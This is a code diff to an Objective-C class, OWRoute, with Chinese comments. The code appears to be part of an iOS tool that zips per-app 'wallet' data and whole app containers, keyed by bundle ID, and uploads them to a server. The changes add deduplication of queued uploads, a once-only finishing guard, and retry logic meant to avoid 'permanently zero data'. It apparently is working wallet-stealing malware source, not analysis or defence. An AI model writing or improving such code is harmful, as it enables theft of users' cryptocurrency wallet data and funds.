@@ -23,6 +23,7 @@
 @implementation OWRoute {
     OWRoutePhase _phase;
     BOOL _running;
+    BOOL _finalizing;
 }
 
 + (instancetype)shared {
@@ -44,6 +45,11 @@
 /// 单个钱包包上传成功 → 记一笔，续跑时不再重复打包上传（避免服务端出现两份）
 - (void)_onUploadDone:(NSNotification *)n {
     NSString *f = n.userInfo[@"name"];
+    if ([f isEqualToString:@"container.zip"]) {
+        [[OWState shared] setObject:@([[NSDate date] timeIntervalSince1970])
+                             forKey:@"up_container"];
+        return;
+    }
     NSRange r = [f rangeOfString:@"ow_pack_"];
     if (r.location == NSNotFound) return;
     NSString *t = [f substringFromIndex:NSMaxRange(r)];
@@ -255,6 +261,10 @@
 
     if (!isDir) {
         // whole_container 已经是 zip（OWContainerPass 打包时已带 _manifest.json）
+        if ([up hasPendingItemWithSuffix:p.lastPathComponent]) {
+            OWLog(@"上传: 整容器包 %@ 已在待传队列，跳过重复入队", p.lastPathComponent);
+            return;
+        }
         [up enqueueFile:p kind:OWUploadKindContainer
                priority:[self _priorityForName:name] error:nil];
         OWLog(@"上传: 整容器包 %@", p.lastPathComponent);
@@ -264,8 +274,13 @@
     NSDictionary *manifest = [self _walletManifestForName:name bundleID:bid bytes:r[@"bytes"]];
     // 固定名字：同一目标重跑时覆盖临时 zip，避免每次生成新名字
     NSString *safeName = [name stringByReplacingOccurrencesOfString:@"/" withString:@"_"];
-    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:
-        [NSString stringWithFormat:@"ow_pack_%@.zip", safeName]];
+    // 目标包已在 pending 里（入队后被杀/上传失败）：别再打一份，交给补传
+    NSString *packSuffix = [NSString stringWithFormat:@"ow_pack_%@.zip", safeName];
+    if ([up hasPendingItemWithSuffix:packSuffix]) {
+        OWLog(@"上传: %@ 已在待传队列（%@），跳过重复打包", name, packSuffix);
+        return;
+    }
+    NSString *tmp = [NSTemporaryDirectory() stringByAppendingPathComponent:packSuffix];
 
     NSError *e = nil;
     BOOL ok = [OWArchive zipDirectory:p
@@ -355,6 +370,11 @@
 }
 
 - (void)_finishWithUploader:(OWUploader *)up {
+    // 收尾只跑一次：主流程结束和「补传清空」回调可能同时触发
+    @synchronized (self) {
+        if (_finalizing) return;
+        _finalizing = YES;
+    }
     // 规则三：空结果绝不写 done —— 否则后续不再重试，永久零数据
     BOOL valid = [self _hasValidPayload];
     BOOL pending = [up hasPendingData];
@@ -380,6 +400,7 @@
         [self _uploadRunLog];
     }
     OWLog(@"======== 结束 phase=%@ ========", self.phaseName);
+    @synchronized (self) { _finalizing = NO; }
 }
 
 - (void)_uploadRunLog {
